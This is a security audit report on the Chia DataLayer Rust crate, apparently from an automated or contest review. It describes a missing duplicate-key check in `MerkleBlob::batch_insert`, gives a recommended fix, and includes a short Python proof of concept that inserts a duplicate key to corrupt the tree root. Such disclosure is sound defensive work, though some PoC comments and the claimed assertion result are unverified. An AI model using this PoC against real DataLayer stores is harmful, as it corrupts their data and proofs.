### Title
`MerkleBlob::batch_insert` Bypasses Duplicate Key/Hash Validation, Enabling DataLayer Tree Root Corruption - (File: `crates/chia-datalayer/src/merkle/blob.rs`)

### Summary

`MerkleBlob::batch_insert` skips the duplicate-key and duplicate-hash guards that `MerkleBlob::insert` enforces, allowing an untrusted caller to silently write duplicate leaf nodes into the DataLayer Merkle tree. The resulting tree root is computed over corrupted state, enabling forged inclusion proofs.

### Finding Description

`MerkleBlob::insert` enforces two invariants before writing any leaf:

```rust
if self.block_status_cache.contains_key(key) {
    return Err(Error::KeyAlreadyPresent());
}
if self.block_status_cache.contains_leaf_hash(hash) {
    return Err(Error::HashAlreadyPresent());
}
``` [1](#0-0) 

`batch_insert` takes a different code path. When the tree already contains two or more leaves (`leaf_count > 1`), the entire input batch bypasses the guarded `insert()` call and goes directly to `insert_entry_to_blob`:

```rust
for ((key, value), hash) in keys_values_hashes {
    let new_leaf_index = self.get_new_index();
    let new_block = Block { ..., node: Node::Leaf(LeafNode { hash, key, value, ... }) };
    self.insert_entry_to_blob(new_leaf_index, &new_block)?;   // no duplicate check
    indexes.push(new_leaf_index);
}
``` [2](#0-1) 

Even when the tree has 0–1 leaves, only the last two items in the vector are routed through the safe `insert()` path (via `pop()`); all earlier items still reach the unguarded loop: [3](#0-2) 

`insert_entry_to_blob` writes raw bytes to the blob without consulting `block_status_cache`. The cache's `add_leaf` method — which registers the key and hash — is never called for these fast-path entries: [4](#0-3) 

Consequently:
- Duplicate leaf nodes are physically written into the blob.
- The `block_status_cache` (`key_to_index`, `leaf_hash_to_index`) diverges from the actual blob contents.
- `calculate_lazy_hashes` then computes the tree root over the corrupted blob, producing a root that commits to duplicate state.
- `get_proof_of_inclusion` builds proofs from the cache, which may point to the wrong leaf or miss the duplicate entirely.

The Python binding `py_batch_insert` exposes this path directly to untrusted callers: [5](#0-4) 

### Impact Explanation

An attacker who can call `MerkleBlob.batch_insert` (Python API) with a batch containing duplicate `KeyId` or `Hash` values causes the DataLayer Merkle tree to commit a corrupted root. Downstream consumers of `get_proof_of_inclusion` receive proofs that validate against a root derived from duplicate/inconsistent leaf state, enabling forged inclusion or exclusion proofs. This matches the allowed High impact: *DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.*

### Likelihood Explanation

The Python binding is the primary interface for DataLayer operations. Any caller constructing a batch with repeated keys or hashes — whether accidentally or maliciously — triggers the bug. No special privilege is required; only the ability to call `batch_insert` with attacker-controlled input.

### Recommendation

Add the same duplicate guards to the fast path inside `batch_insert` before calling `insert_entry_to_blob`:

```rust
for ((key, value), hash) in keys_values_hashes {
    if self.block_status_cache.contains_key(key) {
        return Err(Error::KeyAlreadyPresent());
    }
    if self.block_status_cache.contains_leaf_hash(&hash) {
        return Err(Error::HashAlreadyPresent());
    }
    // ... existing insert_entry_to_blob call
}
```

Additionally, ensure `add_leaf` is called for every leaf written via the fast path so the cache stays consistent with the blob.

### Proof of Concept

```python
from chia_rs.datalayer import MerkleBlob, KeyId, ValueId
import hashlib

blob = MerkleBlob(blob=bytearray())

# Pre-populate to trigger the fast path (leaf_count > 1)
for i in range(3):
    kid = KeyId(i)
    vid = ValueId(i)
    h = hashlib.sha256(i.to_bytes(8, "big")).digest()
    blob.insert(kid, vid, h)

blob.calculate_lazy_hashes()
root_before = blob.get_root_hash()  # legitimate root

# Now batch_insert with a duplicate key (key=0 already exists)
dup_key = KeyId(0)
dup_val = ValueId(999)
dup_hash = hashlib.sha256(b"duplicate").digest()

# Items beyond the first 2 (from the end) bypass duplicate checks
batch_keys = [(KeyId(100), ValueId(100)), (KeyId(101), ValueId(101)), (dup_key, dup_val)]
batch_hashes = [
    hashlib.sha256(b"k100").digest(),
    hashlib.sha256(b"k101").digest(),
    dup_hash,
]
blob.batch_insert(batch_keys, batch_hashes)  # succeeds — no error raised

blob.calculate_lazy_hashes()
root_after = blob.get_root_hash()
# root_after is computed over a tree containing two leaves with key=0
# proof_of_inclusion for key=0 now reflects corrupted state
proof = blob.get_proof_of_inclusion(dup_key)
assert proof.valid()  # passes, but proves wrong/duplicate state
```

    #[pyo3(name = "batch_insert")]
    pub fn py_batch_insert(
        &mut self,
        keys_values: Vec<(KeyId, ValueId)>,
        hashes: Vec<Hash>,
    ) -> PyResult<()> {
        if keys_values.len() != hashes.len() {
            Err(Error::UnmatchedKeysAndValues(
                keys_values.len(),
                hashes.len(),
            ))?;
        }

        self.batch_insert(zip(keys_values, hashes).collect())?;

        Ok(())
    }
